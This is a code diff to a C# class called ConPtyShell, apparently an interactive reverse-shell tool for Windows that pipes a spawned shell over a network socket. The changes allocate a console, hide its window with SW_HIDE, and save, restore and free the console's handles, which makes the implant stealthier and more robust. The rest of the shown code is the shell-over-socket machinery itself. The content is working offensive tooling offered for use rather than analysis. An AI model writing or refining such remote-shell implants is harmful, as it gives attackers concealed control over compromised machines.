@@ -18,6 +18,7 @@ public static class ConPtyShell
     private const int BUFFER_SIZE_PIPE = 1048576;
 
     private const UInt32 INFINITE = 0xFFFFFFFF;
+    private const int SW_HIDE = 0;
     private const uint GENERIC_READ = 0x80000000;
     private const uint GENERIC_WRITE = 0x40000000;
     private const uint FILE_SHARE_READ = 0x00000001;
@@ -137,6 +138,19 @@ public static class ConPtyShell
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool GetConsoleMode(IntPtr handle, out uint mode);
     
+    [DllImport("kernel32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool AllocConsole();
+    
+    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+    private static extern bool FreeConsole();
+    
+    [DllImport("user32.dll")]
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetConsoleWindow();
+    
     [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
     
@@ -188,12 +202,21 @@ public static class ConPtyShell
             throw new InvalidOperationException("Could not create the OutputPipe");
     }
     
-    private static void InitConsole(){
+    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr){
+        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
+        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
         IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
         IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
         SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
         SetStdHandle(STD_ERROR_HANDLE, hStdout);
         SetStdHandle(STD_INPUT_HANDLE, hStdin); 
+    }
+    
+    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr){
+        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
+        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
+        SetStdHandle(STD_INPUT_HANDLE, oldStdIn); 
     }
     
     private static void EnableVirtualTerminalSequenceProcessing()
@@ -333,9 +356,13 @@ public static class ConPtyShell
         IntPtr OutputPipeRead = new IntPtr(0);
         IntPtr OutputPipeWrite = new IntPtr(0);
         IntPtr handlePseudoConsole = new IntPtr(0);
+        IntPtr oldStdIn = new IntPtr(0);
+        IntPtr oldStdOut = new IntPtr(0);
+        IntPtr oldStdErr = new IntPtr(0);
+        bool newConsoleAllocated = false;
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
-        InitConsole();
+        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
         if(GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") == IntPtr.Zero){
             Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
             STARTUPINFO sInfo = new STARTUPINFO();
@@ -348,6 +375,11 @@ public static class ConPtyShell
         }
         else{
             Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell...\r\n");
+            if(GetConsoleWindow() == IntPtr.Zero){
+                AllocConsole();
+                ShowWindow(GetConsoleWindow(), SW_HIDE);
+                newConsoleAllocated = true;
+            }
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if(pseudoConsoleCreationResult != 0)
             {
@@ -370,6 +402,9 @@ public static class ConPtyShell
         thReadSocketWritePipe.Abort();
         shellSocket.Shutdown(SocketShutdown.Both);
         shellSocket.Close();
+        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
+        if(newConsoleAllocated)
+            FreeConsole();
         CloseHandle(childProcessInfo.hThread);
         CloseHandle(childProcessInfo.hProcess);
         if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
